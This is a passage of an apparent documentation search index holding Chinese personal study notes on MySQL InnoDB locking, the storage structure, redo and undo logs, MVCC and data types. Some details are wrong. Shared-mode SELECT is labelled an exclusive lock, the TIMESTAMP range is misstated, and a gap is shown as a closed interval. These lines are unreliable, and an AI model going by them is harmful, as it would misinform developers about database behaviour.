uff09;\u5f53\u5bf9\u8868\u7ed3\u6784\u8fdb\u884c\u53d8\u66f4\u64cd\u4f5c\u7684\u65f6\u5019\uff0c\u52a0MDL\u5199\u9501\uff08\u6392\u4ed6\uff09\u3002  </p> </li> <li> <p>\u610f\u5411\u9501: \u4e3a\u4e86\u907f\u514dDML\u5728\u6267\u884c\u65f6\uff0c\u52a0\u7684\u884c\u9501\u4e0e\u8868\u9501\u7684\u51b2\u7a81\uff0c\u5728InnoDB\u4e2d\u5f15\u5165\u4e86\u610f\u5411\u9501\uff0c\u4f7f\u5f97\u8868\u9501\u4e0d\u7528\u68c0\u67e5\u6bcf\u884c\u6570\u636e\u662f\u5426\u52a0\u9501\uff0c\u4f7f\u7528\u610f\u5411\u9501\u6765\u51cf\u5c11\u8868\u9501\u7684\u68c0\u67e5\u3002 \u4e00\u4e2a\u5ba2\u6237\u7aef\u5bf9\u67d0\u4e00\u884c\u52a0\u4e0a\u4e86\u884c\u9501\uff0c\u90a3\u4e48\u7cfb\u7edf\u4e5f\u4f1a\u5bf9\u5176\u52a0\u4e0a\u4e00\u4e2a\u610f\u5411\u9501\uff0c\u5f53\u522b\u7684\u5ba2\u6237\u7aef\u6765\u60f3\u8981\u5bf9\u5176\u52a0\u4e0a\u8868\u9501\u65f6\uff0c\u4fbf\u4f1a\u68c0\u67e5\u610f\u5411\u9501\u662f\u5426\u517c\u5bb9\uff0c\u82e5\u662f\u4e0d\u517c\u5bb9\uff0c\u4fbf\u4f1a\u963b\u585e\u76f4\u5230\u610f\u5411\u9501\u91ca\u653e\u3002  </p> </li> </ol> <p>\u610f\u5411\u9501\u517c\u5bb9\u6027\uff1a 1. \u610f\u5411\u5171\u4eab\u9501\uff08IS\uff09\uff1a\u4e0e\u8868\u9501\u5171\u4eab\u9501\uff08read\uff09\u517c\u5bb9\uff0c\u4e0e\u8868\u9501\u6392\u5b83\u9501\uff08write\uff09\u4e92\u65a5\u3002 2. \u610f\u5411\u6392\u4ed6\u9501\uff08lX\uff09\uff1a\u4e0e\u8868\u9501\u5171\u4eab\u9501\uff08read\uff09\u53ca\u6392\u5b83\u9501\uff08write\uff09\u90fd\u4e92\u65a5\u3002\u610f\u5411\u9501\u4e4b\u95f4\u4e0d\u4f1a\u4e92\u65a5\u3002  </p> <p>\u884c\u9501\uff1a</p> <p>\u884c\u7ea7\u9501\uff0c\u6bcf\u6b21\u64cd\u4f5c\u9501\u4f4f\u5bf9\u5e94\u7684\u884c\u6570\u636e\u3002\u9501\u5b9a\u7c92\u5ea6\u6700\u5c0f\uff0c\u53d1\u751f\u9501\u51b2\u7a81\u7684\u6982\u7387\u6700\u4f4e\uff0c\u5e76\u53d1\u5ea6\u6700\u9ad8\u3002\u5e94\u7528\u5728InnoDB\u5b58\u50a8\u5f15\u64ce\u4e2d\u3002 InnoDB\u7684\u6570\u636e\u662f\u57fa\u4e8e\u7d22\u5f15\u7ec4\u7ec7\u7684\uff0c\u884c\u9501\u662f\u901a\u8fc7\u5bf9\u7d22\u5f15\u4e0a\u7684\u7d22\u5f15\u9879\u52a0\u9501\u6765\u5b9e\u73b0\u7684\uff0c\u800c\u4e0d\u662f\u5bf9\u8bb0\u5f55\u52a0\u7684\u9501\u3002\u5bf9\u4e8e\u884c\u7ea7\u9501\uff0c\u4e3b\u8981\u5206\u4e3a\u4ee5\u4e0b\u4e09\u7c7b\uff1a  </p> <ol> <li>\u884c\u9501\uff08Record Lock\uff09\uff1a\u9501\u5b9a\u5355\u4e2a\u884c\u8bb0\u5f55\u7684\u9501\uff0c\u9632\u6b62\u5176\u4ed6\u4e8b\u52a1\u5bf9\u6b64\u884c\u8fdb\u884cupdate\u548cdelete\u3002\u5728RC\uff08read commit \uff09\u3001RR\uff08repeat read\uff09\u9694\u79bb\u7ea7\u522b\u4e0b\u90fd\u652f\u6301\u3002</li> <li>\u95f4\u9699\u9501\uff08GapLock\uff09\uff1a\u9501\u5b9a\u7d22\u5f15\u8bb0\u5f55\u95f4\u9699\uff08\u4e0d\u542b\u8be5\u8bb0\u5f55\uff09\uff0c\u786e\u4fdd\u7d22\u5f15\u8bb0\u5f55\u95f4\u9699\u4e0d\u53d8\uff0c\u9632\u6b62\u5176\u4ed6\u4e8b\u52a1\u5728\u8fd9\u4e2a\u95f4\u9699\u8fdb\u884cinsert\uff0c\u4ea7\u751f\u5e7b\u8bfb\u3002\u5728RR\u9694\u79bb\u7ea7\u522b\u4e0b\u90fd\u652f\u6301\u3002\u6bd4\u5982\u8bf4 \u4e24\u4e2a\u4e34\u8fd1\u53f6\u5b50\u8282\u70b9\u4e3a 15 23\uff0c\u90a3\u4e48\u95f4\u9699\u5c31\u662f\u6307 [15 , 23],\u9501\u7684\u662f\u8fd9\u4e2a\u95f4\u9699\u3002</li> <li>\u4e34\u952e\u9501\uff08Next-Key Lock\uff09\uff1a\u884c\u9501\u548c\u95f4\u9699\u9501\u7ec4\u5408\uff0c\u540c\u65f6\u9501\u4f4f\u6570\u636e\uff0c\u5e76\u9501\u4f4f\u6570\u636e\u524d\u9762\u7684\u95f4\u9699Gap\u3002\u5728RR\u9694\u79bb\u7ea7\u522b\u4e0b\u652f\u6301\u3002</li> </ol> <p>InnoDB\u5b9e\u73b0\u4e86\u4ee5\u4e0b\u4e24\u79cd\u7c7b\u578b\u7684\u884c\u9501\uff1a 1. \u5171\u4eab\u9501\uff08S\uff09\uff1a\u5141\u8bb8\u4e00\u4e2a\u4e8b\u52a1\u53bb\u8bfb\u4e00\u884c\uff0c\u963b\u6b62\u5176\u4ed6\u4e8b\u52a1\u83b7\u5f97\u76f8\u540c\u6570\u636e\u96c6\u7684\u6392\u5b83\u9501\u3002 2. \u6392\u4ed6\u9501\uff08X\uff09\uff1a\u5141\u8bb8\u83b7\u53d6\u6392\u4ed6\u9501\u7684\u4e8b\u52a1\u66f4\u65b0\u6570\u636e\uff0c\u963b\u6b62\u5176\u4ed6\u4e8b\u52a1\u83b7\u5f97\u76f8\u540c\u6570\u636e\u96c6\u7684\u5171\u4eab\u9501\u548c\u6392\u4ed6\u9501\u3002</p> SQL \u884c\u9501\u7c7b\u578b \u8bf4\u660e insert \u6392\u4ed6\u9501  \u3000 \u81ea\u52a8\u52a0\u9501 \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 update \u6392\u4ed6\u9501  \u3000 \u81ea\u52a8\u52a0\u9501 delete \u6392\u4ed6\u9501 \u81ea\u52a8\u52a0\u9501 \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 select \u4e0d\u52a0\u4efb\u4f55\u9501\u3000 select\u3000lock\u3000in\u3000share mode \u6392\u4ed6\u9501 \u9700\u8981\u624b\u52a8\u5728SELECT\u4e4b\u540e\u52a0LOCK IN SHARE MODE select\u3000for\u3000update \u6392\u4ed6\u9501 \u9700\u8981\u624b\u52a8\u5728SELECT\u4e4b\u540e\u52a0FOR UPDATE \u3000\u3000\u3000\u3000 <p>\u884c\u9501 - \u6f14\u793a  </p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cInnoDB\u5728REPEATABLE READ\u4e8b\u52a1\u9694\u79bb\u7ea7\u522b\u8fd0\u884c\uff0cInnoDB\u4f7f\u7528next-key \u9501\u8fdb\u884c\u641c\u7d22\u548c\u7d22\u5f15\u626b\u63cf\uff0c\u4ee5\u9632\u6b62\u5e7b\u8bfb\u3002</p> <ol> <li>\u9488\u5bf9\u552f\u4e00\u7d22\u5f15\u8fdb\u884c\u68c0\u7d22\u65f6\uff0c\u5bf9\u5df2\u5b58\u5728\u7684\u8bb0\u5f55\u8fdb\u884c\u7b49\u503c\u5339\u914d\u65f6\uff0c\u5c06\u4f1a\u81ea\u52a8\u4f18\u5316\u4e3a\u884c\u9501\u3002</li> <li>InnoDB\u7684\u884c\u9501\u662f\u9488\u5bf9\u4e8e\u7d22\u5f15\u52a0\u7684\u9501\uff0c\u4e0d\u901a\u8fc7\u7d22\u5f15\u6761\u4ef6\u68c0\u7d22\u6570\u636e\uff0c\u90a3\u4e48InnoDB\u5c06\u5bf9\u8868\u4e2d\u7684\u6240\u6709\u8bb0\u5f55\u52a0\u9501\uff0c\u6b64\u65f6\u5c31\u4f1a\u5347\u7ea7\u4e3a\u8868\u9501\u3002</li> </ol> <p>\u95f4\u9699\u9501/\u4e34\u952e\u9501-\u6f14\u793a</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cInnoDB\u5728REPEATABLE READ\u4e8b\u52a1\u9694\u79bb\u7ea7\u522b\u8fd0\u884c\uff0cInnoDB\u4f7f\u7528next-key \u9501\u8fdb\u884c\u641c\u7d22\u548c\u7d22\u5f15\u626b\u63cf\uff0c\u4ee5\u9632\u6b62\u5e7b\u8bfb\u3002</p> <ol> <li>\u7d22\u5f15\u4e0a\u7684\u7b49\u503c\u67e5\u8be2\uff08\u552f\u4e00\u7d22\u5f15\uff09\uff0c\u7ed9\u4e0d\u5b58\u5728\u7684\u8bb0\u5f55\u52a0\u9501\u65f6\uff0c\u4f18\u5316\u4e3a\u95f4\u9699\u9501\u3002</li> <li>\u7d22\u5f15\u4e0a\u7684\u7b49\u503c\u67e5\u8be2\uff08\u666e\u901a\u7d22\u5f15\uff09\uff0c\u5411\u53f3\u904d\u5386\u65f6\u6700\u540e\u4e00\u4e2a\u503c\u4e0d\u6ee1\u8db3\u67e5\u8be2\u9700\u6c42\u65f6\uff0cnext-key lock \u9000\u5316\u4e3a\u95f4\u9699\u9501\u3002</li> <li>\u7d22\u5f15\u4e0a\u7684\u8303\u56f4\u67e5\u8be2\uff08\u552f\u4e00\u7d22\u5f15\uff09--\u4f1a\u8bbf\u95ee\u5230\u4e0d\u6ee1\u8db3\u6761\u4ef6\u7684\u7b2c\u4e00\u4e2a\u503c\u4e3a\u6b62\u3002</li> </ol> <p>\u6ce8\u610f\uff1a\u95f4\u9699\u9501\u552f\u4e00\u76ee\u7684\u662f\u9632\u6b62\u5176\u4ed6\u4e8b\u52a1\u63d2\u5165\u95f4\u9699\u3002\u95f4\u9699\u9501\u53ef\u4ee5\u5171\u5b58\uff0c\u4e00\u4e2a\u4e8b\u52a1\u91c7\u7528\u7684\u95f4\u9699\u9501\u4e0d\u4f1a\u963b\u6b62\u53e6\u4e00\u4e2a\u4e8b\u52a1\u5728\u540c\u4e00\u95f4\u9699\u4e0a\u91c7\u7528\u95f4\u9699\u9501\u3002</p>"},{"location":"program/2024-04-22-MYSQL/#innodb_1","title":"InnoDB \u5f15\u64ce","text":""},{"location":"program/2024-04-22-MYSQL/#_86","title":"\u903b\u8f91\u5b58\u50a8\u7ed3\u6784","text":"<p>\u8868\u7a7a\u95f4\uff08ibd\u6587\u4ef6\uff09\uff0c\u4e00\u4e2amysql\u5b9e\u4f8b\u53ef\u4ee5\u5bf9\u5e94\u591a\u4e2a\u8868\u7a7a\u95f4\uff0c\u7528\u4e8e\u5b58\u50a8\u8bb0\u5f55\u3001\u7d22\u5f15\u7b49\u6570\u636e\u3002</p> <p>\u6bb5\uff0c\u5206\u4e3a\u6570\u636e\u6bb5\uff08Leaf node segment\uff09\u3001\u7d22\u5f15\u6bb5\uff08Non-leaf node segment\uff09\u3001\u56de\u6eda\u6bb5\uff08Rollback segment\uff09\uff0cInnoDB\u662f\u7d22\u5f15\u7ec4\u7ec7\u8868\uff0c\u6570\u636e\u6bb5\u5c31\u662fB+\u6811\u7684\u53f6\u5b50\u8282\u70b9\uff0c\u7d22\u5f15\u6bb5\u5373\u4e3aB+\u6811\u7684\u975e\u53f6\u5b50\u8282\u70b9\u3002\u6bb5\u7528\u6765\u7ba1\u7406\u591a\u4e2aExtent\uff08\u533a\uff09\u3002</p> <p>\u533a\uff0c\u8868\u7a7a\u95f4\u7684\u5355\u5143\u7ed3\u6784\uff0c\u6bcf\u4e2a\u533a\u7684\u5927\u5c0f\u4e3a1M\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cInnoDB\u5b58\u50a8\u5f15\u64ce\u9875\u5927\u5c0f\u4e3a16K\uff0c\u5373\u4e00\u4e2a\u533a\u4e2d\u4e00\u5171\u670964\u4e2a\u8fde\u7eed\u7684\u9875\u3002</p> <p>\u9875\uff0c\u662fInnoDB\u5b58\u50a8\u5f15\u64ce\u78c1\u76d8\u7ba1\u7406\u7684\u6700\u5c0f\u5355\u5143\uff0c\u6bcf\u4e2a\u9875\u7684\u5927\u5c0f\u9ed8\u8ba4\u4e3a16KB\u3002\u4e3a\u4e86\u4fdd\u8bc1\u9875\u7684\u8fde\u7eed\u6027\uff0cInnoDB\u5b58\u50a8\u5f15\u64ce\u6bcf\u4ece\u78c1\u76d8\u7533\u8bf74-5\u4e2a\u533a\u3002\u4e00\u9875\u5305\u542b\u82e5\u5e72\u884c\u3002</p> <p>\u884c\uff0cInnoDB\u5b58\u50a8\u5f15\u64ce\u6570\u636e\u662f\u6309\u8fdb\u884c\u5b58\u653e\u7684\u3002</p>"},{"location":"program/2024-04-22-MYSQL/#_87","title":"\u67b6\u6784","text":"<p>Buffer Pool\uff1a\u7f13\u51b2\u6c60\u662f\u4e3b\u5185\u5b58\u4e2d\u7684\u4e00\u4e2a\u533a\u57df\uff0c\u91cc\u9762\u53ef\u4ee5\u7f13\u5b58\u78c1\u76d8\u4e0a\u7ecf\u5e38\u64cd\u4f5c\u7684\u771f\u5b9e\u6570\u636e\uff0c\u5728\u6267\u884c\u589e\u5220\u6539\u67e5\u64cd\u4f5c\u65f6\uff0c\u5148\u64cd\u4f5c\u7f13\u51b2\u6c60\u4e2d\u7684\u6570\u636e\uff08\u82e5\u7f13\u51b2\u6c60\u6ca1\u6709\u6570\u636e\uff0c\u5219\u4ece\u78c1\u76d8\u52a0\u8f7d\u5e76\u7f13\u5b58\uff09\uff0c\u7136\u540e\u518d\u4ee5\u4e00\u5b9a\u9891\u7387\u5237\u65b0\u5230\u78c1\u76d8\uff0c\u4ece\u800c\u51cf\u5c11\u78c1\u76d8I0\uff0c\u52a0\u5feb\u5904\u7406\u901f\u5ea6\u3002</p> <p> </p> <p>\u78c1\u76d8\u67b6\u6784\uff1a  </p> <p>InnoDB\u7684\u6574\u4e2a\u4f53\u7cfb\u7ed3\u6784\u4e3a\uff1a</p> <p>\u5f53\u4e1a\u52a1\u64cd\u4f5c\u7684\u65f6\u5019\u76f4\u63a5\u64cd\u4f5c\u7684\u662f\u5185\u5b58\u7f13\u51b2\u533a\uff0c\u5982\u679c\u7f13\u51b2\u533a\u5f53\u4e2d\u6ca1\u6709\u6570\u636e\uff0c\u5219\u4f1a\u4ece\u78c1\u76d8\u4e2d\u52a0\u8f7d\u5230\u7f13\u51b2\u533a\uff0c\u589e\u5220\u6539\u67e5\u90fd\u662f\u5728\u7f13\u51b2\u533a\u7684\uff0c\u540e\u53f0\u7ebf\u7a0b\u4ee5\u4e00\u5b9a\u7684\u901f\u7387\u5237\u65b0\u5230\u78c1\u76d8\u3002</p>"},{"location":"program/2024-04-22-MYSQL/#_88","title":"\u4e8b\u52a1\u539f\u7406","text":"<p>\u4e8b\u52a1\u662f\u4e00\u7ec4\u64cd\u4f5c\u7684\u96c6\u5408\uff0c\u5b83\u662f\u4e00\u4e2a\u4e0d\u53ef\u5206\u5272\u7684\u5de5\u4f5c\u5355\u4f4d\uff0c\u4e8b\u52a1\u4f1a\u628a\u6240\u6709\u7684\u64cd\u4f5c\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u4e00\u8d77\u5411\u7cfb\u7edf\u63d0\u4ea4\u6216\u64a4\u9500\u64cd\u4f5c\u8bf7\u6c42\uff0c\u5373\u8fd9\u4e9b\u64cd\u4f5c\u8981\u4e48\u540c\u65f6\u6210\u529f\uff0c\u8981\u4e48\u540c\u65f6\u8d25\u3002\u5177\u6709ACID\u56db\u5927\u7279\u5f81\u3002</p> <p>\u539f\u5b50\u6027\uff0c\u4e00\u81f4\u6027\uff0c\u6301\u4e45\u6027\u8fd9\u4e09\u5927\u7279\u6027\u7531 redo log \u548c undo log \u65e5\u5fd7\u6765\u4fdd\u8bc1\u7684\u3002 \u9694\u79bb\u6027 \u662f\u7531\u9501\u673a\u5236\u548cMVCC\u4fdd\u8bc1\u7684\u3002</p> <p>redo log:</p> <p>\u91cd\u505a\u65e5\u5fd7\uff0c\u8bb0\u5f55\u7684\u662f\u4e8b\u52a1\u63d0\u4ea4\u65f6\u6570\u636e\u9875\u7684\u7269\u7406\u4fee\u6539\uff0c\u662f\u7528\u6765\u5b9e\u73b0\u4e8b\u52a1\u7684\u6301\u4e45\u6027\u3002 \u8be5\u65e5\u5fd7\u6587\u4ef6\u7531\u4e24\u90e8\u5206\u7ec4\u6210\uff1a\u91cd\u505a\u65e5\u5fd7\u7f13\u51b2\uff08redo log buffer\uff09\u4ee5\u53ca\u91cd\u505a\u65e5\u5fd7\u6587\u4ef6\uff08redo log file\uff09\uff0c\u524d\u8005\u662f\u5728\u5185\u5b58\u4e2d\uff0c\u540e\u8005\u5728\u78c1\u76d8\u4e2d\u3002\u5f53\u4e8b\u52a1\u63d0\u4ea4\u4e4b\u540e\u4f1a\u628a\u6240\u6709\u4fee\u6539\u4fe1\u606f\u90fd\u5b58\u5230\u8be5\u65e5\u5fd7\u6587\u4ef6\u4e2d\uff0c\u7528\u4e8e\u5728\u5237\u65b0\u810f\u9875\u5230\u78c1\u76d8\uff0c\u53d1\u751f\u9519\u8bef\u65f6\uff0c\u8fdb\u884c\u6570\u636e\u6062\u590d\u4f7f\u7528\u3002</p> <p>\u4e2a\u4eba\u7406\u89e3\uff1a \u4e8b\u7269\u6bcf\u6b21\u63d0\u4ea4\u7684\u65f6\u5019\u90fd\u4f1a\u5c06\u6570\u636e\u5237\u5230redo log\u4e2d\u800c\u4e0d\u662f\u76f4\u63a5\u5c06buffer pool\u4e2d\u7684\u6570\u636e\u76f4\u63a5\u5237\u5230\u78c1\u76d8\u4e2d\uff08ibd\u6587\u4ef6\u4e2d\uff09\uff0c\u662f\u56e0\u4e3aredo log \u662f\u987a\u5e8f\u5199\uff0c\u6027\u80fd\u5904\u7406\u7684\u591f\u5feb\uff0c\u76f4\u63a5\u5237\u5230ibd\u4e2d\uff0c\u662f\u968f\u673a\u5199\uff0c\u6027\u80fd\u6162\u3002\u6240\u4ee5\u810f\u9875\u662f\u5728\u4e0b\u4e00\u6b21\u8bfb\u7684\u65f6\u5019\uff0c\u6216\u8005\u540e\u53f0\u7ebf\u7a0b\u91c7\u7528\u4e00\u5b9a\u7684\u673a\u5236\u8fdb\u884c\u5237\u76d8\u5230ibd\u4e2d\u3002</p> <p>undo log: \u56de\u6eda\u65e5\u5fd7\uff0c\u7528\u4e8e\u8bb0\u5f55\u6570\u636e\u88ab\u4fee\u6539\u524d\u7684\u4fe1\u606f\uff0c\u4f5c\u7528\u5305\u542b\u4e24\u4e2a\uff1a\u63d0\u4f9b\u56de\u6eda\u548cMVCC\uff08\u591a\u7248\u672c\u5e76\u53d1\u63a7\u5236\uff09\u3002 undo log\u548credo log\u8bb0\u5f55\u7269\u7406\u65e5\u5fd7\u4e0d\u4e00\u6837\uff0c\u5b83\u662f\u903b\u8f91\u65e5\u5fd7\u3002\u53ef\u4ee5\u8ba4\u4e3a\u5f53delete\u4e00\u6761\u8bb0\u5f55\uff0cundo log\u4e2d\u4f1a\u8bb0\u5f55\u4e00\u6761\u5bf9\u5e94\u7684insert\u8bb0\u5f55\uff0c\u53cd\u4e4b\u4ea6\u7136\uff0c\u5f53update\u4e00\u6761\u8bb0\u5f55\u65f6\uff0c\u5b83\u8bb0\u5f55\u4e00\u6761\u5bf9\u5e94\u76f8\u53cd\u7684update\u8bb0\u5f55\u3002\u5f53\u6267\u884crollback\u65f6\uff0c\u5c31\u53ef\u4ee5\u4eceundo log\u4e2d\u7684\u903b\u8f91\u8bb0\u5f55\u8bfb\u53d6\u5230\u76f8\u5e94\u7684\u5185\u5bb9\u5e76\u8fdb\u884c\u56de\u6eda\u3002  </p> <p>Undo log\u9500\u6bc1\uff1aundo log\u5728\u4e8b\u52a1\u6267\u884c\u65f6\u4ea7\u751f\uff0c\u4e8b\u52a1\u63d0\u4ea4\u65f6\uff0c\u5e76\u4e0d\u4f1a\u7acb\u5373\u5220\u9664undo log\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u65e5\u5fd7\u53ef\u80fd\u8fd8\u7528\u4e8eMVCC\u3002 Undo log\u5b58\u50a8\uff1aundo log\u91c7\u7528\u6bb5\u7684\u65b9\u5f0f\u8fdb\u884c\u7ba1\u7406\u548c\u8bb0\u5f55\uff0c\u5b58\u653e\u5728\u524d\u9762\u4ecb\u7ecd\u7684rollback segment\u56de\u6eda\u6bb5\u4e2d\uff0c\u5185\u90e8\u5305\u542b1024\u4e2aundo log segment\u3002</p>"},{"location":"program/2024-04-22-MYSQL/#mvcc","title":"MVCC","text":""},{"location":"program/2024-04-22-MYSQL/#_89","title":"\u5f53\u524d\u8bfb:","text":"<p>\u8bfb\u53d6\u7684\u662f\u8bb0\u5f55\u7684\u6700\u65b0\u7248\u672c\uff0c\u8bfb\u53d6\u65f6\u8fd8\u8981\u4fdd\u8bc1\u5176\u4ed6\u5e76\u53d1\u4e8b\u52a1\u4e0d\u80fd\u4fee\u6539\u5f53\u524d\u8bb0\u5f55\uff0c\u4f1a\u5bf9\u8bfb\u53d6\u7684\u8bb0\u5f55\u8fdb\u884c\u52a0\u9501\u3002\u5bf9\u4e8e\u6211\u4eec\u65e5\u5e38\u7684\u64cd\u4f5c\uff0c\u5982\uff1a * select...lock in share mode\uff08\u5171\u4eab\u9501\uff09\u3002 * select..\u2026for update\u3001update\u3001insert\u3001delete\uff08\u6392\u4ed6\u9501\uff09\u90fd\u662f\u4e00\u79cd\u5f53\u524d\u8bfb\u3002</p>"},{"location":"program/2024-04-22-MYSQL/#_90","title":"\u5feb\u7167\u8bfb:","text":"<p>\u7b80\u5355\u7684select\uff08\u4e0d\u52a0\u9501\uff09\u5c31\u662f\u5feb\u7167\u8bfb\uff0c\u5feb\u7167\u8bfb\uff0c\u8bfb\u53d6\u7684\u662f\u8bb0\u5f55\u6570\u636e\u7684\u53ef\u89c1\u7248\u672c\uff0c\u6709\u53ef\u80fd\u662f\u5386\u53f2\u6570\u636e\uff0c\u4e0d\u52a0\u9501\uff0c\u662f\u975e\u963b\u585e\u8bfb\u3002 * Read Committed\uff1a\u6bcf\u6b21select\uff0c\u90fd\u751f\u6210\u4e00\u4e2a\u5feb\u7167\u8bfb\u3002 * Repeatable Read\uff1a\u5f00\u542f\u4e8b\u52a1\u540e\u7b2c\u4e00\u4e2aselect\u8bed\u53e5\u624d\u662f\u5feb\u7167\u8bfb\u7684\u5730\u65b9\u3002 * Serializable\uff1a\u5feb\u7167\u8bfb\u4f1a\u9000\u5316\u4e3a\u5f53\u524d\u8bfb\u3002</p>"},{"location":"program/2024-04-22-MYSQL/#mvcc_1","title":"MVCC:","text":"<p>\u5168\u79f0Multi-Version Concurrency Control\uff0c\u591a\u7248\u672c\u5e76\u53d1\u63a7\u5236\u3002\u6307\u7ef4\u62a4\u4e00\u4e2a\u6570\u636e\u7684\u591a\u4e2a\u7248\u672c\uff0c\u4f7f\u5f97\u8bfb\u5199\u64cd\u4f5c\u6ca1\u6709\u51b2\u7a81\uff0c\u5feb\u7167\u8bfb\u4e3aMySQL\u5b9e\u73b0MVCC\u63d0\u4f9b\u4e86\u4e00\u4e2a\u975e\u963b\u585e\u8bfb\u529f\u80fd\u3002MVCC\u7684\u5177\u4f53\u5b9e\u73b0\uff0c\u8fd8\u9700\u8981\u4f9d\u8d56\u4e8e\u6570\u636e\u5e93\u8bb0\u5f55\u4e2d\u7684\u4e09\u4e2a\u9690\u5f0f\u5b57\u6bb5\u3001undo log\u65e5\u5fd7\u3001readView\u3002</p>"},{"location":"program/2024-04-22-MYSQL/#mvcc_2","title":"MVCC \u5b9e\u73b0\u539f\u7406:","text":"<p>\u6709\u4e09\u4e2a\u9690\u85cf\u7684\u5b57\u6bb5:</p> <p></p> <p>undo log\u56de\u6eda\u65e5\u5fd7\uff0c\u5728insert\u3001update\u3001delete\u7684\u65f6\u5019\u4ea7\u751f\u7684\u4fbf\u4e8e\u6570\u636e\u56de\u6eda\u7684\u65e5\u5fd7\u3002 \u5f53insert\u7684\u65f6\u5019\uff0c\u4ea7\u751f\u7684undo log\u65e5\u5fd7\u53ea\u5728\u56de\u6eda\u65f6\u9700\u8981\uff0c\u5728\u4e8b\u52a1\u63d0\u4ea4\u540e\uff0c\u53ef\u88ab\u7acb\u5373\u5220\u9664\u3002 \u800cupdate\u3001delete\u7684\u65f6\u5019\uff0c\u4ea7\u751f\u7684undo log\u65e5\u5fd7\u4e0d\u4ec5\u5728\u56de\u6eda\u65f6\u9700\u8981\uff0c\u5728\u5feb\u7167\u8bfb\u65f6\u4e5f\u9700\u8981\uff0c\u4e0d\u4f1a\u7acb\u5373\u88ab\u5220\u9664\u3002</p> <p>undo log \u7248\u672c\u94fe\uff1a</p> <p>undo log\u65e5\u5fd7\u4f1a\u8bb0\u5f55\u539f\u6765\u7684\u7248\u672c\u7684\u6570\u636e\uff0c\u56e0\u4e3a\u662f\u901a\u8fc7undo log \u65e5\u5fd7\u8fdb\u884c\u56de\u6eda\u7684\u3002</p> <p></p> <p>\u5982\u4f55\u786e\u5b9a\u8fd4\u56de\u54ea\u4e00\u4e2a\u7248\u672c \u8fd9\u662f\u7531read view\u51b3\u5b9a\u8fd4\u56de undo log \u4e2d\u7684\u54ea\u4e00\u4e2a\u7248\u672c\u3002</p> <p></p> <p>RC\u9694\u79bb\u7ea7\u522b\u4e0b\uff0c\u5728\u4e8b\u52a1\u4e2d\u6bcf\u4e00\u6b21\u6267\u884c\u5feb\u7167\u8bfb\u65f6\u751f\u6210ReadView\u3002 RR\u9694\u79bb\u7ea7\u522b\u4e0b\uff0c\u5728\u4e8b\u52a1\u4e2d\u7b2c\u4e00\u6b21\u6267\u884c\u5feb\u7167\u8bfb\u65f6\u751f\u6210ReadView\uff0c\u540e\u7eed\u4f1a\u590d\u7528\u3002  </p> <p>https://www.bilibili.com/video/BV1Kr4y1i7ru?p=145&amp;spm_id_from=pageDriver&amp;vd_source=bbc04b831b54029788a178a7c2e9ae20</p> <p>MVCC \u9760 \u9690\u85cf\u5b57\u6bb5 , undo log \u7248\u672c\u94fe , read view \u5b9e\u73b0\u7684\u3002</p> <ul> <li>\u539f\u5b50\u6027-undo log </li> <li>\u6301\u4e45\u6027-redo log</li> <li>\u4e00\u81f4\u6027-undo log + redo log</li> <li>\u9694\u79bb\u6027-\u9501 + MVCC</li> </ul> <p></p>"},{"location":"program/2024-04-22-MYSQL/#_91","title":"\u6570\u636e\u7c7b\u578b","text":""},{"location":"program/2024-04-22-MYSQL/#_92","title":"\u6574\u578b","text":"\u7c7b\u578b\u540d\u79f0 \u53d6\u503c\u8303\u56f4 \u5927\u5c0f TINYINT -128\u301c127 1\u4e2a\u5b57\u8282 SMALLINT -32768\u301c32767 2\u4e2a\u5b87\u8282 MEDIUMINT -8388608\u301c8388607 3\u4e2a\u5b57\u8282 INT (INTEGHR) -2147483648\u301c2147483647 4\u4e2a\u5b57\u8282 BIGINT -9223372036854775808\u301c9223372036854775807 8\u4e2a\u5b57\u8282 <p>\u65e0\u7b26\u53f7\u5728\u6570\u636e\u7c7b\u578b\u540e\u52a0 unsigned \u5173\u952e\u5b57\u3002</p>"},{"location":"program/2024-04-22-MYSQL/#_93","title":"\u6d6e\u70b9\u578b","text":"\u7c7b\u578b\u540d\u79f0 \u8bf4\u660e \u5b58\u50a8\u9700\u6c42 FLOAT \u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570 4 \u4e2a\u5b57\u8282 DOUBLE \u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570 8 \u4e2a\u5b57\u8282 DECIMAL (M, D)\uff0cDEC \u538b\u7f29\u7684\u201c\u4e25\u683c\u201d\u5b9a\u70b9\u6570 M+2 \u4e2a\u5b57\u8282"},{"location":"program/2024-04-22-MYSQL/#_94","title":"\u65e5\u671f\u548c\u65f6\u95f4","text":"\u7c7b\u578b\u540d\u79f0 \u65e5\u671f\u683c\u5f0f \u65e5\u671f\u8303\u56f4 \u5b58\u50a8\u9700\u6c42 YEAR YYYY 1901 ~ 2155 1 \u4e2a\u5b57\u8282 TIME HH:MM:SS -838:59:59 ~ 838:59:59 3 \u4e2a\u5b57\u8282 DATE YYYY-MM-DD 1000-01-01 ~ 9999-12-3 3 \u4e2a\u5b57\u8282 DATETIME YYYY-MM-DD HH:MM:SS 1000-01-01 00:00:00 ~ 9999-12-31 23:59:59 8 \u4e2a\u5b57\u8282 TIMESTAMP YYYY-MM-DD HH:MM:SS 1980-01-01 00:00:01 UTC ~ 2040-01-19 03:14:07 UTC 4 \u4e2a\u5b57\u8282"},{"location":"program/2024-04-22-MYSQL/#_95","title":"\u5b57\u7b26\u4e32","text":"\u7c7b\u578b\u540d\u79f0 \u8bf4\u660e \u5b58\u50a8\u9700\u6c42 CHAR(M) \u56fa\u5b9a\u957f\u5ea6\u975e\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32 M \u5b57\u8282\uff0c1&lt;=M&lt;=255 VARCHAR(M) \u53d8\u957f\u975e\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32 L+1\u5b57\u8282\uff0c\u5728\u6b64\uff0cL&lt; = M\u548c 1&lt;=M&lt;=255 TINYTEXT \u975e\u5e38\u5c0f\u7684\u975e\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32 L+1\u5b57\u8282\uff0c\u5728\u6b64\uff0cL&lt;2^8 